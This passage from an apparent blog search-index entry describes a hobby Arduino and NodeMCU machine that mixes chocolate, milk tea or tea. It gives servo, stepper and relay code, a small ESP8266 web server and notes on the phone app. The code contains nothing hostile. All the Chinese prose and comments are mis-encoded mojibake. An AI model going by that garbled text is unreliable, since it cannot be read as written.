class="line">Â delay(<span class="number">1000</span>);</span><br><span class="line">Â <span class="keyword">for</span> (pos = <span class="number">0</span>; pos &lt;= <span class="number">120</span>; pos += <span class="number">1</span>) &#123; <span class="comment">//å¯å¯:140 //å¥¶èŒ¶: 40 //èŒ¶:120</span></span><br><span class="line">Â goal.write(pos);Â </span><br><span class="line">Â delay(<span class="number">15</span>);Â </span><br><span class="line">Â &#125;</span><br><span class="line">Â <span class="keyword">for</span> (pos = <span class="number">120</span>; pos &gt;= <span class="number">0</span>; pos -= <span class="number">1</span>) &#123;Â </span><br><span class="line">Â goal.write(pos);Â </span><br><span class="line">Â delay(<span class="number">15</span>);Â </span><br><span class="line">Â &#125;</span><br><span class="line">Â delay(<span class="number">1000</span>);</span><br><span class="line">Â X.step(<span class="number">22000</span>);Â </span><br><span class="line">Â <span class="comment">// delay(500);</span></span><br><span class="line">Â <span class="comment">// Y.step(-17000);</span></span><br><span class="line">Â delay(<span class="number">1000</span>);</span><br><span class="line">Â digitalWrite(WATER, HIGH);</span><br><span class="line">Â delay(<span class="number">5000</span>);</span><br><span class="line">Â digitalWrite(WATER, LOW);</span><br><span class="line">Â delay(<span class="number">5000</span>);</span><br><span class="line"><span class="comment">//while(1) &#123; &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæƒ³è¦å–å¾Œæ’çš„é£²æ–™ï¼Œå°±å¿…é ˆï¼Œå…ˆç§»å‹•Yè»¸åˆ°å¾Œæ’å†ç§»å‹•Xè»¸åˆ°å®šé»ï¼Œæ¥è‘—servo motorè½‰å‹•å–æ–™ï¼Œå†ç§»å‹•Xè»¸è‡³åŸä½ï¼ŒYè»¸ç§»è‡³èµ·å§‹ä½ç½®åŠ æ°´ï¼Œæœ€å¾Œå•Ÿå‹•æŠ½æ°´é¦¬é”å‰‡å®Œç•¢ã€‚</p><blockquote><p>ç¨‹å¼å¿…é ˆæ ¹æ“šå®¹å™¨æ“ºæ”¾ä½ç½®ï¼Œå’ŒåŸæ–™å‡ºæ–™æ™‚é–“ï¼ŒæŠ½æ°´é‡å¤šå¯¡ä¾†èª¿æ•´delayæ™‚é–“ï¼Œä¸”å‰æ’ä¸éœ€è¦ç§»å‹•Yè»¸ã€‚</p></blockquote><p>NodeMCU ç¨‹å¼ç¢¼:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> RELAY1 D7 <span class="comment">//CHOOCLATE</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RELAY2 D8 <span class="comment">// COFFEE</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RELAY3 D5 <span class="comment">// Tea</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ESP8266WiFi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WiFiClient.h&gt;</span>Â </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ESP8266WebServer.h&gt;</span></span></span><br><span class="line">String command; <span class="comment">//String to store app command state.</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* ssid = <span class="string">&quot;å°ˆé¡Œ&quot;</span>;</span><br><span class="line">ESP8266WebServer <span class="title function_">server</span><span class="params">(<span class="number">80</span>)</span>;</span><br><span class="line"><span class="type">int</span> counter = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> &#123;</span><br><span class="line">pinMode(RELAY1, OUTPUT);</span><br><span class="line">Â pinMode(RELAY2, OUTPUT);</span><br><span class="line">Â pinMode(RELAY3, OUTPUT);</span><br><span class="line">Serial.begin(<span class="number">115200</span>);</span><br><span class="line">Â </span><br><span class="line"><span class="comment">// Connecting WiFi</span></span><br><span class="line">WiFi.mode(WIFI_AP);</span><br><span class="line">Â WiFi.softAP(ssid);</span><br><span class="line">IPAddress myIP = WiFi.softAPIP();</span><br><span class="line">Â Serial.print(<span class="string">&quot;AP IP address: &quot;</span>);</span><br><span class="line">Â Serial.println(myIP);</span><br><span class="line">Â </span><br><span class="line">Â <span class="comment">// Starting WEB-serverÂ </span></span><br><span class="line">Â server.on ( <span class="string">&quot;/&quot;</span>, HTTP_handleRoot );</span><br><span class="line">Â server.onNotFound ( HTTP_handleRoot );</span><br><span class="line">Â server.begin();Â </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å·§å…‹åŠ›</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">relay1</span><span class="params">()</span>&#123;</span><br><span class="line">Â delay(<span class="number">1000</span>);</span><br><span class="line">Â digitalWrite(RELAY1,HIGH);</span><br><span class="line">Â delay(<span class="number">180000</span>);</span><br><span class="line">Â digitalWrite(RELAY1,LOW);</span><br><span class="line">Â delay(<span class="number">5000</span>);</span><br><span class="line">Â &#125;</span><br><span class="line"><span class="comment">//å¥¶èŒ¶æˆ–å’–å•¡</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">relay2</span><span class="params">()</span>&#123;</span><br><span class="line">Â delay(<span class="number">1000</span>);</span><br><span class="line">Â digitalWrite(RELAY2,HIGH);</span><br><span class="line">Â delay(<span class="number">180000</span>);</span><br><span class="line">Â digitalWrite(RELAY2,LOW);</span><br><span class="line">Â delay(<span class="number">5000</span>);</span><br><span class="line">Â &#125;</span><br><span class="line"><span class="comment">//èŒ¶</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">relay3</span><span class="params">()</span>&#123;</span><br><span class="line">Â delay(<span class="number">1000</span>);</span><br><span class="line">Â digitalWrite(RELAY3,HIGH);</span><br><span class="line">Â delay(<span class="number">145000</span>);</span><br><span class="line">Â digitalWrite(RELAY3,LOW);</span><br><span class="line">Â delay(<span class="number">5000</span>);</span><br><span class="line">Â &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span> &#123;</span><br><span class="line">Â server.handleClient();</span><br><span class="line">Â </span><br><span class="line">Â command = server.arg(<span class="string">&quot;State&quot;</span>); <span class="comment">//åªæœ‰æ‰‹æ©Ÿæ”¹è®Šstateï¼Œä¸‹é¢commandæ‰æœƒè®Š</span></span><br><span class="line">Â </span><br><span class="line">Â <span class="keyword">if</span> (command == <span class="string">&quot;L&quot;</span>) &#123;</span><br><span class="line">Â relay1(); <span class="comment">/*chocoltae*/</span></span><br><span class="line">Â &#125;</span><br><span class="line">Â <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="string">&quot;R&quot;</span>) &#123;</span><br><span class="line">Â relay2(); <span class="comment">/*milk tea */</span></span><br><span class="line">Â &#125;</span><br><span class="line">Â <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="string">&quot;I&quot;</span>)&#123;</span><br><span class="line">Â relay3(); <span class="comment">/*tea*/</span>Â </span><br><span class="line">Â &#125;</span><br><span class="line">Â <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="string">&quot;F&quot;</span>)&#123;</span><br><span class="line">Â counter ++;</span><br><span class="line">Â Serial.println(counter);</span><br><span class="line">Â &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">HTTP_handleRoot</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="keyword">if</span>( server.hasArg(<span class="string">&quot;State&quot;</span>) )&#123;</span><br><span class="line">Â Serial.println(server.arg(<span class="string">&quot;State&quot;</span>));</span><br><span class="line">Â &#125;</span><br><span class="line">Â server.send ( <span class="number">200</span>, <span class="string">&quot;text/html&quot;</span>, <span class="string">&quot;&quot;</span> );</span><br><span class="line">Â delay(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰‹æ©Ÿç«¯</p><blockquote><p>ç•¶æ™‚ä¸æœƒå¯«æ‰‹æ©ŸApp :(ï¼Œå› æ­¤ç”¨ç°¡å–®çš„MIT AppInventor ä¾†è£½ä½œ</p></blockquote><p><img src="https://i.imgur.com/3QvP8RH.png"><br><img src="https://i.imgur.com/qefwDHP.png"><br><img src="https://i.imgur.com/sZfOMW0.png"></p><h2 id="å¯¦éš›æ“ä½œ"><a href="#å¯¦éš›æ“ä½œ" class="headerlink" title="å¯¦éš›æ“ä½œ"></a>å¯¦éš›æ“ä½œ</h2><ol><li>å®¹å™¨å¡«æ–™</li><li>è£æ°´å®¹å™¨åŠ æ°´</li><li>power supply on</li><li>æ‰‹æ©Ÿé€£åˆ°Wifi AP</li><li>é–‹å•Ÿ APPé¸æ“‡æƒ³å–çš„é£²æ–™</li><li>ç­‰å¾…æ©Ÿå™¨å®Œæˆ</li></ol><p><em>æ•´é«”åœ–</em><br><img src="https://i.imgur.com/UOlH6Vp.jpg"></p><p><em>é‚„æœ‰LEDè·‘é¦¬ç‡ˆ</em><br><img src="https://i.imgur.com/a51d2x3.jpg"></p><h2 id="çµèª"><a href="#çµèª" class="headerlink" title="çµèª"></a>çµèª</h2><p>æ­¤å°ˆé¡Œæœ‰å¾ˆå¤šå¯ä»¥æ”¹é€²çš„åœ°æ–¹ï¼Œä¸è«–æ˜¯å™¨æçš„é¸è³¼ä»¥åŠé¦¬é”çš„ç©©å®šåº¦<br>é›–ç„¶ArduinoçœŸçš„å¾ˆç°¡å–®ï¼Œä½†åªè¦é»å­å¤ å¤šé‚„æ˜¯ç™¼å±•ç„¡çª®ã€‚</p><h2 id="æœªä¾†ç™¼å±•"><a href="#æœªä¾†ç™¼å±•" class="headerlink" title="æœªä¾†ç™¼å±•"></a>æœªä¾†ç™¼å±•</h2><ul><li>ä¸Šæ–¹åŸæ–™ç½å¯è¨­è¨ˆæˆå¯æ‹†å¸å¼</li><li>å¯ä»¥è¨­è¨ˆæ”ªæ‹Œæ¨¡çµ„(ç›´æµé¦¬é”é…å†°æ£’æ£ä¹‹é¡çš„XD)</li><li>é˜²æ°´è¨­è¨ˆ</li><li>APP æ”¹ç”¨ Android Studio è¨­è¨ˆï¼Œæ¯”è¼ƒå¤šå½ˆæ€§</li><li>ç›´æ¥é¸è³¼çµåˆ ESP8266å’Œç¹¼é›»å™¨çš„æ¨¡çµ„(å¾Œä¾†æ‰çŸ¥é“æœ‰é€™æ±è¥¿)</li><li>èªéŸ³è¾¨è­˜ï¼Œä¸ç”¨APP</li><li>åŠ ç†±å™¨ï¼šå¯åŒæ™‚å†·ã€ç†±æ°´æ²–æ³¡</li></ul>]]></content>
      
      
      <categories>
          
          <category> å¯¦ä½œç´€éŒ„ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arduino </tag>
            
            <tag> IOT </tag>
            
            <tag> NodeMCU </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
